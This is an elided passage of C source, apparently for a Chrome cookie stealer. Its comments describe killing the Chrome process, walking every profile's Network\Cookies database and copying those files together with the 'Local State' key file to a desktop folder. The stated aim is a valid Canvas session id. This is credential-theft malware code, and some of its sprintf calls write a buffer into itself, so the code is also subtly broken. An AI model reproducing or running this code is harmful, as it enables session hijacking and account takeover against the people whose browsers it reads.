...
#define SAVE_LOCATION "C:\\Users\\lando\\OneDrive\\Desktop\\"

// Read Chrome cookies CHROME MUST BE CLOSED FIRST BEFORE ACCESSING (therefore we kill the process)
// C:\\Users\\xxx\\AppData\\Local\\Google\\Chrome\\User Data\\Default\\Network\\Cookies
...
/*
    Iterate through all of the folders
        ...
        For example
        C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Default\Network\Cookies
        C:\Users\xxx\AppData\Local\Google\Chrome\User Data\Profile 1\Network\Cookies
        etc
    ...
    Order of steps:
        ...
        If all goes to plan you should have a valid canvas session id
...
void takeLocalFiles(char** userProfiles, int* userIndex, char rootDirectory[MAX_PATH])
{
    ...
    for (int i = 0; i < *userIndex; i++)
    {
        ...
        char destinationPath[MAX_PATH] = SAVE_LOCATION;
        sprintf(destinationPath, "%sCookies%d", destinationPath, i);
    ...
    char destinationPath[MAX_PATH] = SAVE_LOCATION;
    sprintf(destinationPath, "%sLocal State", destinationPath);
